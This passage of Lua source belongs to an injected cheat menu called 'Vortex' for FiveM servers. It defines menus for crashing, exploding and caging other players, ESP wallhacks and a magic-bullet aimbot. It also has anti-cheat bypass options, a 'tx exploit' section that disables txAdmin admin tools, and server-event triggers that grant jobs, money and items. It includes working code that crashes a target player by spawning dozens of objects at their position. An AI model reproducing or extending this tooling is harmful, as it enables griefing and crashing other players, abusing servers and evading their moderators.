                    {label = "Detach All Entitys", action = "detachallentitys"},
                    {label = "Solo Session", action = "solosession"},
                    {label = "Misc Target (G)", action = "misctarget"}
                }
            },
            {
                name = "Movement",
                items = {
                    {label = "", isSeparator = true, separatorText = "noclip"},
                    {label = "Noclip", action = "noclipbind"},
                    {label = "Noclip Type", action = "nocliptype", hasSelector = true},
                    {label = "Noclip Speed", action = "noclipspeed", hasSelector = true},
                    {label = "", isSeparator = true, separatorText = "freecam"},
                    {label = "Freecam", action = "freecam"},
                    {label = "", isSeparator = true, separatorText = "other"},
                    {label = "Invisible", action = "invisible"},
                    {label = "Fast Run", action = "fastrun"},
                    {label = "Super Jump", action = "superjump"},
                    {label = "No Ragdoll", action = "noragdoll"},
                    {label = "Anti Freeze", action = "antifreeze"}
                }
            },
            {
                name = "Wardrobe",
                items = {
                    {label = "Random Outfit", action = "randomoutfit"},
                    {label = "", isSeparator = true, separatorText = "Clothing"},
                    {label = "Hat", action = "outfit_hat", hasSelector = true},
                    {label = "Mask", action = "outfit_mask", hasSelector = true},
                    {label = "Glasses", action = "outfit_glasses", hasSelector = true},
                    {label = "Torso", action = "outfit_torso", hasSelector = true},
                    {label = "Tshirt", action = "outfit_tshirt", hasSelector = true},
                    {label = "Pants", action = "outfit_pants", hasSelector = true},
                    {label = "Shoes", action = "outfit_shoes", hasSelector = true},
                    {label = "", isSeparator = true, separatorText = "Models"},
                    {label = "Male", action = "model_male", hasSelector = true},
                    {label = "Female", action = "model_female", hasSelector = true},
                    {label = "Animals", action = "model_animals", hasSelector = true}
                }
            }
        }
    },
    online = {
        title = "Online Options",
        hasTabs = true,
        tabs = {
            {
                name = "Player List",
                items = {},
                isDynamic = true
            },
            {
                name = "Troll",
                items = {
                    {label = "Copy Appearance", action = "copyappearance"},
                    {label = "Shoot Player", action = "shootplayer"},
                    {label = "Bug Player", action = "bugplayer", hasSelector = true},
                    {label = "Crash Player v1", action = "vortex"},
                    {label = "Crash Player v2", action = "crashplayerv2"},
                    {label = "Cage Player", action = "cageplayer"},
                    {label = "Explode Player", action = "explodeplayer"},
                    {label = "Rain Nearby Vehicle", action = "rainvehicle"},
                    {label = "Drop Nearby Vehicle", action = "dropvehicle"},
                    {label = "Black Hole", action = "blackhole"},
                    {label = "Attach Player", action = "attachplayer"}
                    ,{label = "Ban Player TESTING", action = "banplayertesting"}
                }
            },
            {
                name = "Vehicle",
                items = {
                    {label = "Bug Vehicle", action = "bugvehicle", hasSelector = true},
                    {label = "Warp Vehicle", action = "warpvehicle"},
                    {label = "Warp+Boost", action = "warpboost"},
                    {label = "TP to", action = "tptoocean", hasSelector = true},
                    {label = "Steal Vehicle", action = "stealvehicle"},
                    {label = "Kick Vehicle", action = "kickvehicle", hasSelector = true},
                    {label = "Give Vehicle", action = "givevehicle"},
                    {label = "Give Ramp", action = "giveramp"}
                }
            }
        }
    },
    visual = {
        title = "Visual Options",
        hasTabs = true,
        tabs = {
            {
                name = "Visual",
                items = {
                    {label = "Enable", action = "visual_enable"},
                    {label = "Draw NPCs", action = "visual_draw_npcs"},
                    {label = "Draw On Yourself", action = "visual_draw_self"},
                    {label = "Ignore Dead", action = "visual_ignore_dead"},
                    {label = "Max Distance", action = "visual_distance", hasSelector = true},
                    {label = "Full Bright", action = "visual_fullbright"},
                    {label = "FOV Changer", action = "visual_fov_toggle"},
                    {label = "FOV Size", action = "visual_fov_radius", hasSelector = true},
                    {label = "", isSeparator = true, separatorText = "Crosshair"},
                    {label = "Draw Crosshair", action = "crosshair_toggle"},
                    {label = "Crosshair Style", action = "crosshair_style", hasSelector = true},
                    {label = "Crosshair Size", action = "crosshair_size", hasSelector = true},
                    {label = "Crosshair Thickness", action = "crosshair_thickness", hasSelector = true},
                    {label = "Crosshair Gap", action = "crosshair_gap", hasSelector = true},
                    {label = "Crosshair Color", action = "crosshair_color", hasSelector = true}
                }
            },
            {
                name = "Vehicle",
                items = {
                    {label = "Toggle ESP", action = "vehicle_visual_toggle"},
                    {label = "Draw Spawn Names", action = "vehicle_draw_spawn"},
                    {label = "Draw Lock State", action = "vehicle_draw_lock"},
                    {label = "Drawing Distance", action = "vehicle_distance", hasSelector = true}
                }
            },
            {
                name = "Box",
                items = {
                    {label = "Draw Box", action = "box_toggle"},
                    {label = "Box Thickness", action = "box_thickness", hasSelector = true},
                    {label = "Draw Health", action = "box_draw_health", hasSelector = true},
                    {label = "Draw Armor", action = "box_draw_armor", hasSelector = true},
                    {label = "Box Color", action = "box_color", hasSelector = true},
                    {label = "Invisibility Color", action = "box_invis_color", hasSelector = true},
                    {label = "See Invisible", action = "box_see_invis"}
                }
            },
            {
                name = "Skeleton",
                items = {
                    {label = "Draw Skeleton", action = "skeleton_toggle"},
                    {label = "Skeleton Thickness", action = "skeleton_thickness", hasSelector = true},
                    {label = "Visible Color", action = "skeleton_visible_color", hasSelector = true},
                    {label = "Invisibility Color", action = "skeleton_invis_color", hasSelector = true}
                }
            },
            {
                name = "Text",
                items = {
                    {label = "Toggle Info", action = "text_toggle"},
                    {label = "Name", action = "text_name", hasSelector = true},
                    {label = "ID", action = "text_id", hasSelector = true},
                    {label = "Health", action = "text_health", hasSelector = true},
                    {label = "Armor", action = "text_armor", hasSelector = true},
                    {label = "Distance", action = "text_distance", hasSelector = true},
                    {label = "Weapon", action = "text_weapon", hasSelector = true},
                    {label = "Text Color", action = "text_color", hasSelector = true}
                }
            }
        }
    },
    combat = {
        title = "Combat Options",
        hasTabs = true,
        tabs = {
            {
                name = "General",
                items = {
                    {label = "", isSeparator = true, separatorText = "Magic Bullet"},
                    {label = "Magic Bullet", action = "magicbullet"},
                    {label = "Draw FOV", action = "drawfov", hasSelector = true},
                    {label = "", isSeparator = true, separatorText = "other"},
                    {label = "Shoot Eyes", action = "shooteyes"},
                    {label = "Infinite Ammo", action = "infiniteammo"}
                }
            }
        }
    },
    weapon = {
        title = "Weapon Options",
        hasTabs = true,
        tabs = {
            {
                name = "Spawn",
                items = {
                    {label = "", isSeparator = true, separatorText = "Categories"},
                    {label = "Melee", action = "weapon_melee", hasSelector = true},
                    {label = "Pistol", action = "weapon_pistol", hasSelector = true},
                    {label = "SMG", action = "weapon_smg", hasSelector = true},
                    {label = "Shotgun", action = "weapon_shotgun", hasSelector = true},
                    {label = "Assault Rifle", action = "weapon_ar", hasSelector = true},
                    {label = "Sniper", action = "weapon_sniper", hasSelector = true},
                    {label = "Heavy", action = "weapon_heavy", hasSelector = true}
                }
            }
        }
    },
    vehicle = {
        title = "Vehicule Options",
        hasTabs = true,
        tabs = {
            {
                name = "Spawn",
                items = {
                    {label = "Teleport Into", action = "teleportinto"},
                    {label = "", isSeparator = true, separatorText = "spawn"},
                    {label = "Car", action = "spawncar", hasSelector = true},
                    {label = "Moto", action = "spawnmoto", hasSelector = true},
                    {label = "Plane", action = "spawnplane", hasSelector = true},
                    {label = "Boat", action = "spawnboat", hasSelector = true},
                    {label = "Addon", action = "addonvehicle", hasSelector = true}
                }
            },
            {
                name = "Performance",
                items = {
                    {label = "Max Upgrade", action = "maxupgrade"},
                    {label = "Repair Vehicle", action = "repairvehicle"},
                    {label = "Force Vehicle Engine", action = "forcevehicleengine"},
                    {label = "Easy Handling", action = "easyhandling"},
                    {label = "Boost Vehicle", action = "boostvehicle"}
                }
            },
            {
                name = "Extra",
                items = {
                    {label = "Clean Vehicle", action = "cleanvehicle"},
                    {label = "Delete Vehicle", action = "deletevehicle"},
                    {label = "Unlock Closest Vehicle", action = "unlockclosestvehicle"},
                    {label = "Teleport into Closest Vehicle", action = "teleportintoclosestvehicle"},
                    {label = "Gravitate Vehicle", action = "gravitatevehicle"},
                    {label = "No Collision", action = "nocolision"},
                    {label = "Give Nearest Vehicle", action = "givenearstvehicle"},
                    {label = "Ramp Vehicle", action = "rampvehicle"}
                }
            }
        }
    },
    misc = {
        title = "Misc Options",
        hasTabs = true,
        tabs = {
            {
                name = "General",
                items = {
                    {label = "Teleport", action = "category", target = "teleport_category"},
                    {label = "triggers dynamiques", action = "category", target = "triggers_dynamiques"},
                    {label = "Server Stuff", action = "category", target = "serverstuff"},
                    {label = "tx exploit", action = "category", target = "tx_exploit"}
                }
            },
            {
                name = "Bypasses",
                items = {
                    {isSeparator = true, separatorText = "Anti Cheat"},
                    {label = "Bypass AC", action = "bypassac", hasSelector = true},
                    {label = "Checker Anti-Cheats", action = "checkanticheats"},
                    {isSeparator = true, separatorText = "Server"},
                    {label = "Dynasty", action = "category", target = "dynasty"}
                }
            },
            {
                name = "Resources",
                items = {
                    {label = "Loading...", action = "none"}
                }
            }
        }
    },
    tx_exploit = {
        title = "tx exploit",
        items = {
            {label = "txAdmin Player IDs", action = "txadminplayerids"},
            {label = "txAdmin Noclip", action = "txadminnoclip"},
            {label = "Disable All txAdmin", action = "disablealltxadmin"},
            {label = "Disable txAdmin Teleport", action = "disabletxadminteleport"},
            {label = "Disable txAdmin Freeze", action = "disabletxadminfreeze"}
        }
    },
    triggers_dynamiques = {
        title = "triggers dynamiques",
        items = {}
    },
    teleport_category = {
        title = "Teleport",
        items = {
            {label = "TP to Waypoint", action = "tp_waypoint"},
            {label = "FIB Building", action = "tp_fib"},
            {label = "Mission Row PD", action = "tp_missionrow"},
            {label = "Pillbox Hospital", action = "tp_pillbox"},
            {label = "Grove Street", action = "tp_grovestreet"},
            {label = "Legion Square", action = "tp_legionsquare"}
        }
    },
    serverstuff = {
        title = "Server Stuff",
        items = {
            {label = "Triggers Finder (F8)", action = "triggersfinder"},
            {label = "Event Logger", action = "eventlogger"}
        }
    },
    dynasty = {
        title = "Dynasty",
        items = {
            {label = "Menu Staff", action = "menustaff"},
            {label = "Give Weapon", action = "category", target = "giveweapon"}
        }
    },
    giveweapon = {
        title = "Give Weapon",
        items = {
            {label = "Give Weapon Caveira", action = "giveweaponcaveira"},
            {label = "Give Weapon AA", action = "giveweaponaa"}
        }
    }
}

local vortex_godmodeEnabled = false
local vortex_antiHeadshotEnabled = false
local vortex_bypassDrivebyEnabled = false
local vortex_bypassACOptions = {"EagleAC", "Anvil", "ReaperV4", "WaveShield"}
local vortex_selectedBypassAC = 1
local vortex_bypassACEnabled = false
local vortex_stopResourceList = {}
local vortex_selectedStopResource = 1
local vortex_eventloggerEnabled = false
local vortex_antiCheatsToDetect = {
    "waveshield", "totem", "vigilante", "xtremeshield", "xtreme", "redline",
    "fivsec", "fivemsecurity", "acf", "maverick", "breach", "fusion",
    "anvil", "eagleac", "reaperv4", "reaper", "electronac", "fiveguards", "fiveguard"
}

local function vortex_extractPaths(content)
    if not content or type(content) ~= "string" then return {} end
    local found = {}

    for s in string.gmatch(content, '"([^"]+)"') do
        table.insert(found, s)
    end
    for s in string.gmatch(content, "'([^']+)'") do
        table.insert(found, s)
    end

    local results = {}
    for _, p in ipairs(found) do
        local lp = string.lower(p)
        if lp:match("%.lua$") or lp:match("%.js$") or lp:match("%.json$") or string.find(p, "/") then
            results[p] = true
        end
    end

    local list = {}
    for k, _ in pairs(results) do table.insert(list, k) end
    return list
end

-- Performance / Utility functions
function Vortex_OptimizeFPS()
    pcall(function() ClearAllBrokenGlass() end)
    pcall(function() ClearAllHelpMessages() end)
    pcall(function() LeaderboardsReadClearAll() end)
    pcall(function() ClearBrief() end)
    pcall(function() ClearGpsFlags() end)
    pcall(function() ClearPrints() end)
    pcall(function() ClearSmallPrints() end)
    pcall(function() ClearReplayStats() end)
    pcall(function() LeaderboardsClearCacheData() end)
    pcall(function() ClearFocus() end)
    pcall(function() ClearHdArea() end)
    pcall(function() ClearPedBloodDamage(PlayerPedId()) end)
    pcall(function() ClearPedWetness(PlayerPedId()) end)
    pcall(function() ClearPedEnvDirt(PlayerPedId()) end)
    pcall(function() ResetPedVisibleDamage(PlayerPedId()) end)
end

-- Crash Player v2: spawn many objects at target player's coords
function Vortex_CrashPlayer(playerPed)
    if not playerPed or not DoesEntityExist(playerPed) then return end
    local playerPos = GetEntityCoords(playerPed, false)
    local modelHashes = {
        0x34315488, 0x4F2526DA, 0x6A27FEB1,
        0xC6899CDE, 0xD14B5BA3, 0xD9F4474C,
        0x69D4F974, 0xCAFC1EC3, 0x79B41171,
        0xC07792D4, 0x781E451D, 0x762657C6,
        0xC3C00861, 0x81FB3FF0, 0x45EF7804,
        0xE764D794, 0xFBF7D21F, 0xE1AEB708,
        0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8,
        0x24E08E1F, 0x337B2B54, 0xB9402F87,
        0x8FB233A4, 0xA5E3D471, 0xE65EC0E4,
        0xC2E75A21, 0xC2E75A21, 0x10756510,
        0xCB2ACC80, 0x32A9996C, 0xF51F7309
    }

    for i = 1, #modelHashes do
        local time = 0
        RequestModel(modelHashes[i])
        while not HasModelLoaded(modelHashes[i]) do
            time = time + 100.0
            Citizen.Wait(100.0)
            if time > 5000 then
                print("Could not load model! [" .. tostring(modelHashes[i]) .. "]")
                break
            end
        end
        pcall(function()
            CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
        end)
    end
end

-- Simple RGB rainbow helper
local function Vortex_RGBRainbow(mult)
    mult = mult or 1.0
    local t = GetGameTimer() / 1000.0 * mult
    local r = math.floor((math.sin(t * 2.0) * 0.5 + 0.5) * 255)
    local g = math.floor((math.sin(t * 2.0 + 2.0) * 0.5 + 0.5) * 255)
    local b = math.floor((math.sin(t * 2.0 + 4.0) * 0.5 + 0.5) * 255)
    return { r = r, g = g, b = b }
end

-- Visual preset options (used by the revamped visual module)
local vortex_visualTargetOptions = {"Players", "NPCs", "Players + NPCs"}
local vortex_visualColorModeOptions = {"Palette", "Rainbow"}
local vortex_visualRainbowSpeedOptions = {0.8, 1.1, 1.4, 1.8}

local vortex_visualColorPalettes = {
    {
        name = "Glacier",
        box = {r = 110, g = 190, b = 255, a = 150},
        text = {r = 235, g = 245, b = 255, a = 255},
        tracer = {r = 100, g = 180, b = 255, a = 210},
        crosshair = {r = 255, g = 255, b = 255, a = 220},
        fov = {r = 120, g = 200, b = 255, a = 140}
    },
    {
        name = "Neon Mint",
        box = {r = 110, g = 255, b = 200, a = 160},
        text = {r = 220, g = 255, b = 235, a = 255},
        tracer = {r = 90, g = 230, b = 190, a = 210},
        crosshair = {r = 200, g = 255, b = 230, a = 220},
        fov = {r = 110, g = 245, b = 210, a = 140}
    },
    {
        name = "Sunset",
        box = {r = 255, g = 145, b = 120, a = 160},
        text = {r = 255, g = 225, b = 210, a = 255},
        tracer = {r = 255, g = 120, b = 90, a = 210},
        crosshair = {r = 255, g = 205, b = 180, a = 220},
        fov = {r = 255, g = 150, b = 120, a = 140}
    },
    {
        name = "Infrared",
        box = {r = 255, g = 90, b = 140, a = 160},
        text = {r = 255, g = 210, b = 225, a = 255},
        tracer = {r = 255, g = 70, b = 110, a = 210},
        crosshair = {r = 255, g = 180, b = 200, a = 220},
        fov = {r = 255, g = 110, b = 150, a = 140}
    }
}

local vortex_selectedVisualTarget = 1
local vortex_selectedVisualColorMode = 1
local vortex_selectedVisualPalette = 1
local vortex_selectedRainbowSpeed = 3

-- Kept for backward compatibility with the menu toggle name
local vortex_advancedESPEnabled = false

-- Full bright helper
local vortex_fullBrightActive = false
function Vortex_StartTimecycle(modifier)
    if GetTimecycleTransitionModifierIndex() == -1 and GetTimecycleModifierIndex() == -1 then
        SetTransitionTimecycleModifier(modifier, 5.0)
        vortex_fullBrightActive = true
    else
        ClearTimecycleModifier()
        vortex_fullBrightActive = false
    end
end


local function Vortex_AddTrigger(triggerData)
    if not triggerData or not triggerData.label or not triggerData.action then
        print("^1[ERROR] Vortex_AddTrigger: triggerData invalide^7")
        return
    end

    if not vortex_categories.triggers_dynamiques then
        vortex_categories.triggers_dynamiques = {
            title = "triggers dynamiques",
            items = {}
        }
    end


    for _, item in ipairs(vortex_categories.triggers_dynamiques.items) do
        if item.action == triggerData.action then
            print("^3[WARNING] Trigger '" .. triggerData.action .. "' existe dÃ©jÃ ^7")
            return
        end
    end


    table.insert(vortex_categories.triggers_dynamiques.items, {
        label = triggerData.label,
        action = triggerData.action
    })

    print("^2[TRIGGERS] Trigger ajoutÃ©: " .. triggerData.label .. "^7")
end


local function Vortex_InitDynamicTriggers()

    if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" then
        Vortex_AddTrigger({label = "Deobfuscate Events", action = "deobfuscateevents"})
    end


    if GetResourceState("ox_lib") == "started" then
        Vortex_AddTrigger({label = "Crash Nearby Players", action = "crashnearbyplayers"})
    end


    if GetResourceState("dpemotes") == "started" or GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "Bring All Nearby Players", action = "bringallnearbyplayers"})
    end


    if GetResourceState("mc9-adminmenu") == "started" then
        Vortex_AddTrigger({label = "Admin Menu List (F8)", action = "adminmenulist"})
    end


    if GetResourceState("vMenu") == "started" then
        Vortex_AddTrigger({label = "Message Server", action = "messageserver"})
    end


    if GetResourceState("amigo") == "started" then
        Vortex_AddTrigger({label = "Give Item #1", action = "giveitem1"})
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "End Comserv", action = "endcomserv"})
    end


    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
        Vortex_AddTrigger({label = "Setjob Police #1 (New)", action = "setjobpolice1"})
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "Set Job #2(Police)", action = "setjobpolice2"})
    end


    if GetResourceState("codewave-sneaker-phone") == "started" then
        Vortex_AddTrigger({label = "Give Shoes Reward", action = "giveshoesreward"})
    end


    if GetResourceState("rzrp-base") == "started" then
        Vortex_AddTrigger({label = "Ragdoll Players (RZRP)", action = "ragdollplayersrzrp"})
    end


    if GetResourceState("rzrp-base") == "started" then
        Vortex_AddTrigger({label = "Bag Closest Players (RZRP)", action = "bagclosestplayersrzrp"})
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "Set Gang", action = "setgang"})
    end


    if GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "Give Item #2", action = "giveitem2"})
    end


    if GetResourceState("WayTooCerti_3D_Printer") == "started" then
        Vortex_AddTrigger({label = "Give Item #3", action = "giveitem3"})
    end


    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        Vortex_AddTrigger({label = "Set Chat Tag", action = "setchattag"})
    end


    if GetResourceState("wasabi_multijob") == "started" then
        Vortex_AddTrigger({label = "Set Job #3 (Police)", action = "setjobpolice3"})
    end


    if GetResourceState("wasabi_multijob") == "started" then
        Vortex_AddTrigger({label = "Set Job #2 (EMS)", action = "setjobems"})
    end


    if GetResourceState("ElectronAC") == "started" then
        Vortex_AddTrigger({label = "ElectronAC Admin Panel", action = "electronacadminpanel"})
    end


    if GetResourceState("spoodyFraud") == "started" then
        Vortex_AddTrigger({label = "Give Money #1", action = "givemoney1"})
    end
end


local vortex_noclipEnabled = false
local vortex_noclipSpeed = 10.0
local vortex_healthValue = 100.0
local vortex_armourValue = 100.0
local vortex_noclipInvisibleEnabled = false
local vortex_noclipInvisibleSpeed = 2.0
local vortex_noclipTypeOptions = {"None", "Invisible", "Desync"}
local vortex_selectedNoclipType = 1
local vortex_noclipSpeedOptions = {1, 2, 5, 10, 20, 50}
local vortex_selectedNoclipSpeed = 4 -- index for 10.0 default
vortex_noclipSpeed = vortex_noclipSpeed or vortex_noclipSpeedOptions[vortex_selectedNoclipSpeed]

-- Noclip controller module (keeps API local but preserves compatibility)
local VortexNoclip = { enabled = vortex_noclipEnabled }
function VortexNoclip.Toggle()
    vortex_noclipEnabled = not vortex_noclipEnabled
    VortexNoclip.enabled = vortex_noclipEnabled
    return vortex_noclipEnabled
end
function VortexNoclip.SetSpeed(v)
    vortex_noclipSpeed = tonumber(v) or vortex_noclipSpeed
end
function VortexNoclip.IsEnabled()
    return vortex_noclipEnabled
end
function VortexNoclip.GetSpeed()
    return vortex_noclipSpeed
end

-- By default don't rotate player to camera when noclipging; keeps forward walking direction stable
local vortex_noclipRotateOnCamera = false

local vortex_invisibleEnabled = false
local vortex_fastRunEnabled = false
local vortex_superJumpEnabled = false
local vortex_noRagdollEnabled = false
local vortex_antiFreezeEnabled = false
local vortex_throwvehicleEnabled = false
local vortex_editorModeEnabled = false
local vortex_teleportIntoEnabled = false
local vortex_forceVehicleEngineEnabled = false
local vortex_boostVehicleEnabled = false
local vortex_txAdminPlayerIDsEnabled = false
local vortex_txAdminNoclipEnabled = false
local vortex_disableAllTxAdminEnabled = false
local vortex_disableTxAdminTeleportEnabled = false
local vortex_disableTxAdminFreezeEnabled = false

local vortex_currentTheme = "Vortex"
local vortex_themes = {
    Kirua = {
        banner = "https://i.imgur.com/mse4B9d.jpeg",
        color = {0.2, 0.35, 0.65}
    },
    Zoro = {
        banner = "https://i.imgur.com/3tb3Y8w.jpeg",
        color = {0.15, 0.5, 0.2}
    },
    Vegeto = {
        banner = "https://i.imgur.com/s9sU4z6.jpeg",
        color = {0.65, 0.6, 0.0}
    },
    Sukuna = {
        banner = "https://i.imgur.com/8ph602j.jpeg",
        color = {0.7, 0.35, 0.0}
    },
    Vortex = {
        banner = "https://i.ibb.co/Lz0nRgwV/vortex-banner-purple1.png",
        color = {0.45, 0.15, 0.6}
    }
}

local vortex_nearbyPlayers = {}
local vortex_selectedPlayers = {}
local vortex_spectateEnabled = false
local vortex_blackholeEnabled = false
local vortex_attachplayerEnabled = false
local vortex_selectMode = "all"

-- Shared color palettes used across visual widgets
local vortex_colorPalettes = {
    {name = "White",  color = {r = 255, g = 255, b = 255, a = 200}},
    {name = "Violet", color = {r = 170, g = 110, b = 255, a = 210}},
    {name = "Mint",   color = {r = 110, g = 255, b = 200, a = 210}},
    {name = "Sunset", color = {r = 255, g = 145, b = 120, a = 210}},
    {name = "Infra",  color = {r = 255, g = 90,  b = 140, a = 210}},
    {name = "Amber",  color = {r = 255, g = 190, b = 80,  a = 210}},
    {name = "Ice",    color = {r = 120, g = 200, b = 255, a = 210}},
    {name = "Neon",   color = {r = 120, g = 255, b = 120, a = 210}}
}

local vortex_anchorOptions = {"Top", "Bottom", "Left", "Right"}
local vortex_sideOptions = {"Left", "Right"}
local vortex_crosshairStyles = {"Classic"}

local function vortex_paletteColor(idx)
    local entry = vortex_colorPalettes[idx] or vortex_colorPalettes[1]
    local c = entry.color
    return c.r or 255, c.g or 255, c.b or 255, c.a or 200, entry.name or "Color"
end

local function vortex_clamp(val, minv, maxv)
    if val < minv then return minv end
    if val > maxv then return maxv end
    return val
end

-- VortexVisuals module (rebuild)
local vortex_espDistOptions = {50, 100, 200, 300, 400, 500}
local vortex_selectedEspDist = 4

local VortexVisuals = {
    enable = false,
    drawNPCs = true,
    drawSelf = false,
    ignoreDead = true,
    maxDistance = vortex_espDistOptions[vortex_selectedEspDist],
    fullBright = false,
    fovEnabled = false,
    fovRadius = 0.055,

    targetMode = "Players", -- kept for compatibility

    -- Crosshair
    crosshair = {
        enabled = false,
        style = 1,
        size = 8.0,
        thickness = 2.0,
        gap = 4.0,
        colorIndex = 1
    },

    -- Vehicles
    vehicle = {
        enabled = false,
        drawSpawnName = true,
        drawLockState = true,
        distance = 200.0
    },

    -- Boxes
    box = {
        enabled = true,
        thickness = 2.0,
        drawHealth = true,
        healthSide = 1,
        drawArmor = true,
        armorSide = 2,
        colorIndex = 7,
        invisColorIndex = 5,
        seeInvisible = true
    },

    -- Skeleton
    skeleton = {
        enabled = false,
        thickness = 1.2,
        visibleColor = 1,
        invisColor = 5,
        outlineColor = {r = 0, g = 0, b = 0, a = 220}
    },

    -- Text/infos
    text = {
        enabled = true,
        name = {enabled = true, anchor = 1},
        id = {enabled = true, anchor = 1},
        health = {enabled = false, anchor = 2},
        armor = {enabled = false, anchor = 2},
        distance = {enabled = true, anchor = 2},
        weapon = {enabled = true, anchor = 2},
        colorIndex = 1
    }
}

local function vortex_collectVisualTargets(myPed)
    local targets = {}

    for _, pid in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(pid)
        if ped and DoesEntityExist(ped) then
            if VortexVisuals.drawSelf or ped ~= myPed then
                targets[#targets + 1] = {ped = ped, isPlayer = true, pid = pid}
            end
        end
    end

    if VortexVisuals.drawNPCs then
        for _, ped in ipairs(GetGamePool('CPed')) do
            if DoesEntityExist(ped) and not IsPedAPlayer(ped) then
                if VortexVisuals.drawSelf or ped ~= myPed then
                    targets[#targets + 1] = {ped = ped, isPlayer = false}
                end
            end
        end
    end

    return targets
end

local function vortex_isInvisible(ped)
    return not IsEntityVisible(ped) or IsPedCuffed(ped)
end

local function vortex_drawBox2D(sx, sy, sw, sh, thickness, r, g, b, a)
    local t = math.max(1.0, thickness)
    DrawRect(sx, sy - sh / 2, sw + t / 600, t / 600, r, g, b, a)
    DrawRect(sx, sy + sh / 2, sw + t / 600, t / 600, r, g, b, a)
    DrawRect(sx - sw / 2, sy, t / 600, sh, r, g, b, a)
    DrawRect(sx + sw / 2, sy, t / 600, sh, r, g, b, a)
end

local function vortex_drawHealthArmor(side, sx, sy, sh, percent, thickness, r, g, b, a)
    local barH = sh
    local barW = math.max(0.004, 0.006 * thickness)
    local filledH = math.max(0.0, math.min(1.0, percent)) * barH
    local baseX = sx + (side == 1 and -(0.008 + barW) or (0.008 + barW))
    local topY = sy - (barH / 2)

    DrawRect(baseX, sy, barW + 0.0015, barH + 0.0015, 0, 0, 0, 180)
    DrawRect(baseX, topY + (barH - filledH / 2), barW, filledH, r, g, b, a)
end

local function vortex_getBonePos(ped, bone)
    return GetPedBoneCoords(ped, bone, 0.0, 0.0, 0.0)
end

local vortex_skeletonBones = {
    {31086, 39317},             -- head to neck
    {39317, 24817},             -- neck to spine2
    {24817, 24816},             -- spine2 to spine3
    {24816, 11816},             -- spine3 to pelvis
    {24816, 45509}, {45509, 61163}, {61163, 18905}, -- left arm
    {24816, 40269}, {40269, 43810}, {43810, 57005}, -- right arm
    {11816, 58271}, {58271, 63931}, {63931, 14201}, -- left leg
    {11816, 51826}, {51826, 36864}, {36864, 52301}  -- right leg
}

local vortex_lastFovForced = false

local function vortex_drawSkeleton(ped, color)
    local thickness = VortexVisuals.skeleton.thickness or 1.5
    local passes = math.max(1, math.floor(thickness))
    local offset = 0.003 * thickness
    for _, pair in ipairs(vortex_skeletonBones) do
        local a = vortex_getBonePos(ped, pair[1])
        local b = vortex_getBonePos(ped, pair[2])
        -- Main line
        DrawLine(a.x, a.y, a.z, b.x, b.y, b.z, color.r, color.g, color.b, color.a)
        -- Extra passes for thickness effect
        if passes > 1 then
            for i = 1, passes - 1 do
                local o = offset * i
                DrawLine(a.x + o, a.y, a.z, b.x + o, b.y, b.z, color.r, color.g, color.b, color.a)
                DrawLine(a.x, a.y + o, a.z, b.x, b.y + o, b.z, color.r, color.g, color.b, color.a)
                DrawLine(a.x, a.y, a.z + o, b.x, b.y, b.z + o, color.r, color.g, color.b, color.a)
            end
        end
    end
end

local function vortex_getInfoLines(tgt, dist, isInvisible)
    local lines = {}
    local textSettings = VortexVisuals.text
    if not textSettings.enabled then return lines end

    local function add(name, value, cfg)
        if cfg.enabled then
            table.insert(lines, {text = value, anchor = cfg.anchor})
        end
    end

    local ped = tgt.ped
    local name = tgt.isPlayer and (GetPlayerName(tgt.pid) or "Player") or "NPC"
    local serverId = tgt.isPlayer and GetPlayerServerId(tgt.pid) or 0
    add("name", name, textSettings.name)
    add("id", serverId > 0 and ("ID " .. serverId) or "", textSettings.id)

    local hp = math.floor(GetEntityHealth(ped) - 100)
    local armor = GetPedArmour(ped)
    add("health", "HP " .. tostring(hp), textSettings.health)
    add("armor", "AR " .. tostring(armor), textSettings.armor)
    add("distance", string.format("%.0fm", dist), textSettings.distance)

    local weaponHash = GetSelectedPedWeapon(ped)
    if weaponHash and weaponHash ~= 0 then
        local label = nil
        if GetWeaponDisplayNameFromHash then
            label = GetWeaponDisplayNameFromHash(weaponHash)
        end
        if not label then
            local ok, result = pcall(GetLabelText, GetWeaponName and GetWeaponName(weaponHash) or "")
            if ok and result and result ~= "NULL" then label = result end
        end
        add("weapon", label ~= nil and label or "Weapon", textSettings.weapon)
    else
        add("weapon", "No Weapon", textSettings.weapon)
    end

    return lines
end

Citizen.CreateThread(function()
    -- Wait for injection loading to complete
    while not vortex_loadingComplete do Citizen.Wait(100) end
    while true do
        if VortexVisuals.enable or VortexVisuals.crosshair.enabled or VortexVisuals.vehicle.enabled then
            local myPed = PlayerPedId()
            local myCoords = GetEntityCoords(myPed)
            local sw, sh = GetActiveScreenResolution()

            if VortexVisuals.fovEnabled then
                local camFov = 40.0 + (VortexVisuals.fovRadius * 300.0)
                camFov = vortex_clamp(camFov, 40.0, 110.0)
                local cam = GetRenderingCam()
                if cam and cam ~= 0 then
                    SetCamFov(cam, camFov)
                else
                    -- fallback: use gameplay cam override
                    pcall(function()
                        local gc = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamActive(gc, true)
                        SetCamFov(gc, camFov)
                        RenderScriptCams(true, false, 0, true, false)
                        DestroyCam(gc, false)
                    end)
                end
                vortex_lastFovForced = true
            elseif vortex_lastFovForced then
                RenderScriptCams(false, false, 0, true, false)
                vortex_lastFovForced = false
            end

            -- Player/NPC visuals
            if VortexVisuals.enable then
                for _, tgt in ipairs(vortex_collectVisualTargets(myPed)) do
                    local ped = tgt.ped
                    if DoesEntityExist(ped) then
                        if VortexVisuals.ignoreDead and IsPedDeadOrDying(ped, true) then goto continue end

                        local pcoords = GetEntityCoords(ped)
                        local dist = #(myCoords - pcoords)
                        if dist > VortexVisuals.maxDistance then goto continue end

